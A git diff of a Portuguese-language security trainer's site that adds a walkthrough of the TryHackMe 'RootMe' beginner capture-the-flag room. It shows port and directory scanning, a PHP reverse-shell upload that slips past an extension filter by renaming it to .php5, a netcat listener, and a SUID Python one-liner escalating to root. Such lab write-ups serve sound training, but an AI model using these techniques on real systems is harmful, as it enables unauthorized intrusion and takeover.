@@ -27,16 +27,16 @@
     <!-- Styles -->
     <link href="https://fonts.googleapis.com/css?family=Montserrat:400,600,700" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700,700i" rel="stylesheet">
-    <link href="css/bootstrap.css" rel="stylesheet">
-    <link href="css/fontawesome-all.css" rel="stylesheet">
-    <link href="css/swiper.css" rel="stylesheet">
-    <link href="css/magnific-popup.css" rel="stylesheet">
-    <link href="css/styles.css" rel="stylesheet">
+    <link href="../../css/bootstrap.css" rel="stylesheet">
+    <link href="../../css/fontawesome-all.css" rel="stylesheet">
+    <link href="../../css/swiper.css" rel="stylesheet">
+    <link href="../../css/magnific-popup.css" rel="stylesheet">
+    <link href="../../css/styles.css" rel="stylesheet">
 
     <!-- Website Title -->
-    <title>Gustavo Celani</title>
+    <title>RootMe</title>
     <!-- Favicon  -->
-    <link rel="icon" href="images/logos/gc-favicon.png">
+    <link rel="icon" href="../../images/logos/gc-favicon.png">
 </head>
 
 
@@ -64,7 +64,7 @@
     <nav class="navbar navbar-expand-md navbar-dark navbar-custom fixed-top">
 
         <!-- Image Logo -->
-        <a class="navbar-brand logo-image page-scroll" href="#header"><img src="images/logos/gustavo-celani.png"></a>
+        <a class="navbar-brand logo-image page-scroll no-underline" href="../index.html"><img src="../../images/logos/gustavo-celani.png">&nbsp;&nbsp;&nbsp;&#8592; Voltar</a>
 
         <!-- Mobile Menu Toggle Button -->
         <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsDefault" aria-controls="navbarsDefault" aria-expanded="false" aria-label="Toggle navigation">
@@ -79,22 +79,13 @@
                     <a class="nav-link page-scroll" href="#header">INÍCIO</a>
                 </li>
                 <li class="nav-item">
-                    <a class="nav-link page-scroll" href="#gustavo">QUEM SOU EU?</a>
+                    <a class="nav-link page-scroll" href="../index.html">CTFs</a>
                 </li>
                 <li class="nav-item">
-                    <a class="nav-link page-scroll" href="#palestras">PALESTRAS & MENTORIAS</a>
+                    <a class="nav-link border" target="_blank" href="https://jornadaprofissaohacker.com">JORNADA PROFISSÃO HACKER</a>
                 </li>
                 <li class="nav-item">
-                    <a class="nav-link page-scroll" href="#agenda">AGENDA</a>
-                </li>
-                <li class="nav-item">
-                    <a class="nav-link page-scroll border" href="#treinamentos">TREINAMENTOS</a>
-                </li>
-                <li class="nav-item">
-                    <a class="nav-link page-scroll" href="media-kit.html">MEDIA KIT</a>
-                </li>
-                <li class="nav-item">
-                    <a class="nav-link page-scroll" href="contato.html">CONTATO</a>
+                    <a class="nav-link page-scroll" href="../../index.html">GUSTAVO CELANI</a>
                 </li>
             </ul>
 
@@ -109,7 +100,7 @@
                 <span class="fa-stack">
                     <a id="hotmart" class="event-socials-hotmart page-scroll" href="https://go.hotmart.com/V80030222P?dp=1" target="_blank">
                         <i class="fas fa-circle fa-stack-2x"></i>
-                        <i class="fa-stack-1x"><img class="img-fluid nav-icon" src="images/companies/icons/hotmart.png"></i>
+                        <i class="fa-stack-1x"><img class="img-fluid nav-icon" src="../../images/companies/icons/hotmart.png"></i>
                     </a>
                 </span>
             </span>
@@ -121,41 +112,57 @@
     <!-------------------------------------------------------------------------------------------------------------------------------------------------->
     <!-- Header (Início) -->
     <!-------------------------------------------------------------------------------------------------------------------------------------------------->
-    <header id="header" class="header">
+    <header id="header" class="header header-ctf">
         <div class="header-content">
             <div class="container">
 
                 <!-- Banner row -->
                 <div class="row">
 
-                    <!-- Background Video
-                    <video onloadstart="this.playbackRate = 0.8;" autoplay muted loop id="headerBackgroundVideo">
-                        <source src="videos/header-video.mp4" type="video/mp4">
-                    </video> -->
+                    <!-- Video
+                    <div class="col-lg-6 header-img-small">
+                        <div class="image-container">
+                            <iframe
+                                class="rootme-youtube-player"
+                                frameborder="0"
+                                style="margin-bottom: 1rem; margin-left: 0;">
+                            </iframe>
+                        </div>
+                    </div>
+                    -->
 
                     <!-- Left -->
                     <div class="col-lg-6">
-                        <!-- Logo Image -->
-                        <div class="image-container">
-                            <img class="img-fluid " src="images/logos/gustavo-celani.png" style="margin-top: 8rem;">
-                        </div>
-                        <!-- Subtitle -->
-                        <div class="text-container text-right" style="margin-top: 2rem;">
-                            <h3>
-                                Cybersecurity Engineer
-                                <br>
-                                Ethical Hacker
-                            </h1>
+                        <div class="text-container">
+                            <h2>TryHackMe</h2>
+                            <h1 class="blue">RootMe</h1>
+                            <p class="p-large" style="margin-bottom: 0.5rem;"><i class="fas fa-link"></i> <a target="_blank" href="https://tryhackme.com/room/rrootme">tryhackme.com/room/rrootme</a></p>
+                            <p class="p-large" style="margin-bottom: 0.5rem;"><i class="fas fa-bolt"></i> Easy</p>
+                            <p><i class="fas fa-paragraph"></i> A ctf for beginners, can you root me?</p>
+                            <a style="margin-bottom: 0; font-size: larger;" target="ctf-walkthrough" class="event-cta btn-solid-lg page-scroll" href="#walkthrough"><i class="fas fa-list-ol"></i> WALKTHROUGH</a>
                         </div>
                     </div>
 
                     <!-- Right -->
                     <div class="col-lg-6">
-                        <!-- Upper Image -->
                         <div class="image-container">
-                            <img class="img-fluid" src="images/gustavo/banner01.png">
+                            <img class="img-fluid" style="margin-top: 2rem; width: 80%;" src="../../images/icons/milestones.png">
                         </div>
                     </div>
+
+                    <!-- Video
+                    <div class="col-lg-6 text-center header-img-big">
+                        <div class="image-container">
+                            <iframe
+                                class="rootme-youtube-player"
+                                frameborder="0"
+                                width="600"
+                                height="340"
+                                style="margin-top: 6.5rem;">
+                            </iframe>
+                        </div>
+                    </div>
+                    -->
 
                 </div> <!-- end of Banner row -->
 
@@ -165,89 +172,219 @@
 
 
     <!-------------------------------------------------------------------------------------------------------------------------------------------------->
-    <!-- Gustavo Celani -->
+    <!-- Walkthrough -->
     <!-------------------------------------------------------------------------------------------------------------------------------------------------->
-    <div id="gustavo" class="basic-4">
+    <div id="walkthrough" class="product">
         <div class="container">
-
-            <!-- Logo -->
             <div class="row">
-                <div class="col-lg-5" style="margin-top: 5rem;">
-                    <img class="img-fluid" src="images/logos/gustavo-celani.png">
-                </div>
-            </div>
-
-            <!-- Text Box -->
-            <div class="row">
-                <div class="col-lg-5">
-                    <p class="round-corners" style="margin-top: 2rem;">
-                        <i class="blue fas fa-graduation-cap"></i> Bacharel em Engenharia de Computação<br>
-                        <i class="blue fas fa-graduation-cap"></i> Especialista em Segurança em Redes de Computadores<br>
-                        <i class="blue fas fa-graduation-cap"></i> MBA em Cybersecurity & Ethical Hacking<br>
-                        <i class="blue fas fa-chalkboard"></i> Diversas certificações, artigos e cursos relevantes<br>
-                        <i class="blue fas fa-briefcase"></i> Carreira profissional sólida em empresas renomadas<br>
-
-                        <img class="img-fluid small-logo" src="images/companies/logos/sidi.png">
-                        <img class="img-fluid small-logo" src="images/companies/logos/samsung.png">
-                        <img class="img-fluid small-logo" src="images/companies/logos/stefanini.png">
-                        <img class="img-fluid small-logo" src="images/companies/logos/dell.png">
-                        <img class="img-fluid small-logo" src="images/companies/logos/afterverse.png">
-                        <img class="img-fluid small-logo" src="images/companies/logos/olist.png">
-                    </p>
-                </div>
-            </div>
-
-            <!-- Buttons -->
-            <div class="row">
-                <div class="col-lg-5 text-center">
-                    <a class="btn-solid-lg text-center" target="_blank" href="https://www.linkedin.com/in/gustavocelani"><span class="fab fa-linkedin"></span></a>
-                    <a class="btn-solid-lg text-center" href="https://wa.me/message/7IENGKNI76BBO1" target="_blank"><i class="fab fa-whatsapp"></i></a>
-                    <a class="btn-solid-lg text-center" href="mailto:contato@gustavocelani.com"><i class="fas fa-envelope"></i></a>
-                </div>
-            </div>
-        </div> <!-- end of container -->
-    </div> <!-- end of Gustavo Celani -->
-
-
-    <!-------------------------------------------------------------------------------------------------------------------------------------------------->
-    <!-- Agenda -->
-    <!-------------------------------------------------------------------------------------------------------------------------------------------------->
-    <div id="agenda" class="slider-2">
-        <div class="container">
-            <div class="row text-center">
-
+                
                 <!-- Title -->
                 <div class="col-lg-12 text-center">
-                    <h2 style="margin-bottom: 0;">AGENDA DE <span class="blue">EVENTOS</span></h2>
-                    <p class="p-large">Palestras confirmadas até o momento</p>
+                    <h2 style="margin-bottom: 0;"><span class="blue">WALKTHROUGH</span></h2>
+                    <p class="p-large" style="margin-bottom: 0;"><b class="blue">DICA:</b> Sempre veja a solução após ter tentado resolver o desafio</p>
+                    <p class="p-large">Use a solução para aprender novas técnicas e aperfeiçoar seu repertório para os próximos!</p>
                     <hr>
-                </div>
+                </div> <!-- end of Title-->
 
-                <!-- Image Slider -->
-                <div class="col-lg-12 text-center">
-                    <div class="slider-container">
-                        <div class="swiper-container image-slider">
+                <div class="col-lg-12" style="margin-top: 4rem;">
 
-                            <!-- Dynamically Populated -->
-                            <div id="agenda-slider" class="swiper-wrapper"></div>
+                    <!-- Section -->
+                    <h2 class="blue"><i class="fas fa-terminal"></i> Alvo</h2>
+                    <p><b>Endereço IP:</b> 10.10.149.144</p>
 
-                            <!-- Add Arrows -->
-                            <div class="swiper-button-next"></div>
-                            <div class="swiper-button-prev"></div>
-                            <!-- end of add arrows -->
+                    <!-- Section -->
+                    <h2 style="margin-top: 4rem;" class="blue"><i class="fas fa-terminal"></i> Reconnaissance</h2>
 
-                        </div> <!-- end of swiper-container -->
-                    </div> <!-- end of slider-container -->
-                    <!-- end of image slider -->
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> Scan the machine, how many ports are open?</h4>
+                    <p>Primeiramente, realizo um scan padrão apenas para identificar quais portas estão abertas dentre as mais comuns.</p>
+                    <p class="code-block">$ <b class="command-line">nmap 10.10.149.144</b>
+
+Nmap scan report for 10.10.149.144
+Host is up (0.22s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 25.81 seconds</p>
+
+                    <p>
+                        Identifiquei as 2 portas apertas (22 e 80).
+                        <br>
+                        Agora passo um scan mais agressivo para colher informações mais detalhadas sobre os serviços que estão rodando nessas portas.
+                    </p>
+                    <p class="code-block">$ <b class="command-line">nmap 10.10.149.144 -p 22,80 -A</b>
+
+Nmap scan report for 10.10.149.144
+Host is up (0.35s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HackIT - Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.45 seconds</p>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> What version of Apache is running?</h4>
+                    <p>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</p>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> What service is running on port 22?</h4>
+                    <p>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</p>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> Find directories on the web server using the GoBuster tool.</h4>
+                    <p class="code-block">$ <b class="command-line">gobuster dir -t 50 -u http://10.10.149.144/ -e --no-error -r -w directory-list-lowercase-2.3-small.txt</b>
+
+===============================================================
+Gobuster v3.6
+===============================================================
+[+] Url:                     http://10.10.149.144/
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                directory-list-lowercase-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Follow Redirect:         true
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+http://10.10.149.144/uploads        (Status: 200) [Size: 941]
+http://10.10.149.144/css            (Status: 200) [Size: 1126]
+http://10.10.149.144/js             (Status: 200) [Size: 959]
+http://10.10.149.144/panel          (Status: 200) [Size: 732]
+===============================================================
+Finished
+===============================================================</p>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> What is the hidden directory?</h4>
+                    <p>
+                        Existem 2 diretórios interessantes aqui neste resultado:
+                        <br><b class="blue">- /panel/</b> que é de fato um painel "escondido" porque não existia referência para ele da página principal.
+                        <br><b class="blue">- /uploads/</b> onde provavelmente estarão possíveis arquivos que conseguirmos enviar para o servidor.
+                    </p>
+
+                    <img class="img-fluid walk-img" src="1.png">
+
+                    <p>Acessando o diretório <b class="blue">/panel/</b> me deparo com uma página de upload de arquivos.</p>
+
+                    <!-- Section -->
+                    <h2 style="margin-top: 4rem;" class="blue"><i class="fas fa-terminal"></i> Getting a Shell</h2>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> Find a form to upload and get a reverse shell, and find the flag.</h4>
+                    
+                    <p>A primeira coisa que tentei foi fazer o upload de um arquivo de reverse shell em PHP (rev.php) para ser executado no servidor.</p>
+                    <p><i class="fas fa-link"></i> Referência <a target="_blank" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p>
+                    <p>Porém aqui me deparei com um erro dizendo que a extensão .php não é permitida.</p>
+
+                    <img class="img-fluid walk-img" src="2.png">
+
+                    <p>Para fazer esse bypass, é possível alterar a extensão do arquivo para .php5</p>
+                    <p><i class="fas fa-link"></i> Referência <a target="_blank" href="https://book.hacktricks.xyz/pentesting-web/file-upload">book.hacktricks.xyz/pentesting-web/file-upload</a></p>
+
+                    <p class="code-block">$ <b class="command-line">mv rev.php rev.php5</b></p>
+                    <p>Agora faço o upload novamente, porém com sucesso.</p>
+
+                    <img class="img-fluid walk-img" src="3.png">
+                    <p>
+                        Preciso agora executar esse arquivo PHP que foi feito o upload para o servidor.
+                        <br>
+                        É possível fazer isso por meio do diretório <b>/uploads/</b> que encontramos anteriormente.
+                    </p>
+
+                    <p>Antes de executar o reverse shell, precisamos deixar o IP:PORT configurados no arquivo escutando a conexão reversa:</p>
+                    <p class="code-block">$ <b class="command-line">nc -lvnp 1337</b>
+Listening on 0.0.0.0 1337</p>
+
+                    <p>Com o netcat rodando, eu uso o cURL para fazer um resição que vai executar o nosso payload no servidor alvo:</p>
+                    <p class="code-block">$ <b class="command-line">curl http://10.10.149.144/uploads/rev.php5</b></p>
+
+                    <p>Ao ser executado, o netcat recebe então a conexão do shell reverso interativo vinda do servidor alvo:</p>
+                    <p class="code-block">Connection received on 10.10.149.144 33244
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+14:28:18 up 36 min,  0 users,  load average: 0.00, 0.00, 0.35
+
+$ <b class="command-line">id</b>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</p>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> user.txt</h4>
+                    <p class="code-block">$ <b class="command-line">cat /var/www/user.txt</b>
+THM{y0**************ll}</p>
+
+                    <!-- Section -->
+                    <h2 style="margin-top: 4rem;" class="blue"><i class="fas fa-terminal"></i> Privilege Escalation</h2>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> Search for files with SUID permission, which file is weird?</h4>
+                    <p class="code-block">$ <b class="command-line">find / -type f -perm -u=s 2>/dev/null</b>
+
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/traceroute6.iputils
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chsh
+<b class="code-block">/usr/bin/python</b>
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+...
+/bin/mount
+/bin/su
+/bin/fusermount
+/bin/ping
+/bin/umount</p>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> Find a form to escalate your privileges.</h4>
+                    <p>Se o binário do Python tiver o bit SUID setado (como é o caso), ele não descarta os privilégios elevados e pode ser abusado para acessar o sistema de arquivos, escalar ou manter o acesso privilegiado como um backdoor SUID.</p>
+                    <p><i class="fas fa-link"></i> Referência <a target="_blank" href="https://gtfobins.github.io/gtfobins/python/#suid">gtfobins.github.io/gtfobins/python/#suid</a></p>
+
+                    <p>
+                        Primeiramente eu uso o próprio Python para spwnar um Bash.
+                        <br>
+                        Em seguida, realizo e elevação de privilégios abusando o SUID.
+                    </p>
+
+                    <p class="code-block">$ <b class="command-line">python -c 'import pty;pty.spawn("/bin/bash")'</b>
+bash-4.4$
+
+bash-4.4$ <b class="command-line">/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'</b>
+#
+
+# <b class="command-line">id</b>
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</p>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> root.txt</h4>
+                    <p class="code-block"># <b class="command-line">cat /root/root.txt</b>
+THM{pr****************n}</p>
+
                 </div>
             </div>
 
         </div> <!-- end of container -->
-    </div> <!-- end of Agenda -->
+    </div> <!-- end of Walkthrough -->
 
 
     <!-------------------------------------------------------------------------------------------------------------------------------------------------->
-    <!-- Treinamentos -->
+    <!-- Jornada Profissão Hacker -->
     <!-------------------------------------------------------------------------------------------------------------------------------------------------->
     <div id="treinamentos" class="tabs">
         <div class="container">
@@ -275,10 +412,10 @@
                                 <!-- Image Pane -->
                                 <div class="col-lg-4 shine-figure text-center" style="padding-top: 2rem;">
                                     <a href="https://jornadaprofissaohacker.com">
-                                        <figure><img class="img-fluid" src="images/capas-cursos/jornada-profissao-hacker.png"></figure>
+                                        <figure><img class="img-fluid" src="../../images/capas-cursos/jornada-profissao-hacker.png"></figure>
                                     </a>
                                     <a class="btn-solid-lg text-center" href="https://jornadaprofissaohacker.com">CONHEÇA O TREINAMENTO</a>
-                                    <p class="blue" style="margin-top: 0.5rem;"><b>* Últimas vagas disponíveis</b></p>
+                                    <p class="blue" style="margin-top: 0.5rem;"><b>* Inscrições abertas</b></p>
                                 </div>
                                 <!-- end of image pane -->
 
@@ -333,42 +470,7 @@
                 </div>
             </div> <!-- end of Tab Content -->
         </div> <!-- end of container -->
-    </div> <!-- end of Treinamentos -->
-
-
-    <!-------------------------------------------------------------------------------------------------------------------------------------------------->
-    <!-- Palestras & Workshops / Mentorias Individuais -->
-    <!-------------------------------------------------------------------------------------------------------------------------------------------------->
-    <div id="palestras" class="product">
-        <div class="container">
-            <div class="row text-center">
-                
-                <!-- Title -->
-                <div class="col-lg-12 text-center">
-                    <h2 style="margin-bottom: 0;">PALESTRAS <span class="blue">&</span> MENTORIAS</h2>
-                    <p class="p-large">Entre em contato comigo para agendarmos uma palestra ou uma mentoria individual!</p>
-                    <hr>
-                </div> <!-- end of Title-->
-
-                <div class="col-lg-4">
-                    <a class="btn-solid-lg text-center" href="mailto:contato@gustavocelani.com" style="margin-top: 2rem;"><i class="fas fa-envelope"></i></a>
-                    <p class="blue" style="margin-top: 0.5rem;"><b>contato@gustavocelani.com</b></p>
-                </div>
-
-                <div class="col-lg-4">
-                    <a class="btn-solid-lg text-center" href="media-kit.html" style="margin-top: 2rem;">MEDIA KIT</a>
-                    <p class="blue" style="margin-top: 0.5rem;"><b>Meterial de Divulgação</b></p>
-                </div>
-
-                <div class="col-lg-3">
-                    <a class="btn-solid-lg text-center" href="whatsapp.html" target="_blank" style="margin-top: 2rem;"><i class="fab fa-whatsapp"></i></a>
-                    <p class="blue" style="margin-top: 0.5rem;"><b>+55 11 9 9666-2069</b></p>
-                </div>
-            </div>
-
-        </div> <!-- end of container -->
-    </div> <!-- end of Palestras & Workshops / Mentorias Individuais -->
-
+    </div> <!-- end of Jornada Profissão Hacker -->
 
     <!-------------------------------------------------------------------------------------------------------------------------------------------------->
     <!-- Footer -->
@@ -433,7 +535,7 @@
                         <span class="fa-stack">
                             <a id="hotmart" class="event-socials-hotmart" href="https://go.hotmart.com/V80030222P?dp=1" target="_blank">
                                 <i class="fas fa-circle fa-stack-2x"></i>
-                                <i class="fa-stack-1x"><img class="img-fluid footer-icon" src="images/companies/icons/hotmart.png"></i>
+                                <i class="fa-stack-1x"><img class="img-fluid footer-icon" src="../../images/companies/icons/hotmart.png"></i>
                             </a>
                         </span>
 
@@ -470,15 +572,15 @@
     <!-------------------------------------------------------------------------------------------------------------------------------------------------->
     <!-- Scripts -->
     <!-------------------------------------------------------------------------------------------------------------------------------------------------->
-    <script src="js/jquery.min.js"></script> <!-- jQuery for Bootstrap's JavaScript plugins -->
-    <script src="js/popper.min.js"></script> <!-- Popper tooltip library for Bootstrap -->
-    <script src="js/bootstrap.min.js"></script> <!-- Bootstrap framework -->
-    <script src="js/jquery.easing.min.js"></script> <!-- jQuery Easing for smooth scrolling between anchors -->
-    <script src="js/swiper.min.js"></script> <!-- Swiper for image and text sliders -->
-    <script src="js/jquery.magnific-popup.js"></script> <!-- Magnific Popup for lightboxes -->
-    <script src="js/morphext.min.js"></script> <!-- Morphtext rotating text in the header -->
-    <script src="js/validator.min.js"></script> <!-- Validator.js - Bootstrap plugin that validates forms -->
-    <script src="js/scripts.js"></script> <!-- Custom scripts -->
+    <script src="../../js/jquery.min.js"></script> <!-- jQuery for Bootstrap's JavaScript plugins -->
+    <script src="../../js/popper.min.js"></script> <!-- Popper tooltip library for Bootstrap -->
+    <script src="../../js/bootstrap.min.js"></script> <!-- Bootstrap framework -->
+    <script src="../../js/jquery.easing.min.js"></script> <!-- jQuery Easing for smooth scrolling between anchors -->
+    <script src="../../js/swiper.min.js"></script> <!-- Swiper for image and text sliders -->
+    <script src="../../js/jquery.magnific-popup.js"></script> <!-- Magnific Popup for lightboxes -->
+    <script src="../../js/morphext.min.js"></script> <!-- Morphtext rotating text in the header -->
+    <script src="../../js/validator.min.js"></script> <!-- Validator.js - Bootstrap plugin that validates forms -->
+    <script src="../../js/scripts.js"></script> <!-- Custom scripts -->
 
 </body>
 </html>
